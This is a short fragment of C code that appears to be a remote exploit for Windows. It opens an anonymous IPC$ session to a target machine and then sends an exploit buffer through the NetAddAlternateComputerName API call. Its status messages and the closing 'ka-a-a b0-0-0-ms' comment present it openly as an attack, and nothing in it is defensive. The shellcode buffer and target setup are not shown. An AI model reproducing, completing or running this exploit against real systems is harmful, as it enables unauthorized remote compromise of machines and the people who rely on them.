void send_exp() {
	NETRESOURCE _IPC_;

	_IPC_.lpLocalName = NULL;
	_IPC_.lpProvider = NULL;
	_IPC_.dwType = RESOURCETYPE_ANY;
	_IPC_.lpRemoteName = (char*)&ipc;
	printf("[+] Setting up IPC$ session...\n");
	if (WNetAddConnection2(&_IPC_,"","",0)!=ERROR_SUCCESS) {
		printf("[x] Couldn't establish IPC$ connection.\n");
		exit (1);
	}
	printf("[*] IPC$ session setup successfully!\n");
	printf("[+] Sending exploit ...\n");

	NetAddAlternateComputerName(tgt_net_uni, expl_uni ,NULL,NULL,0);
	// ka-a-a b0-0-0-ms //
}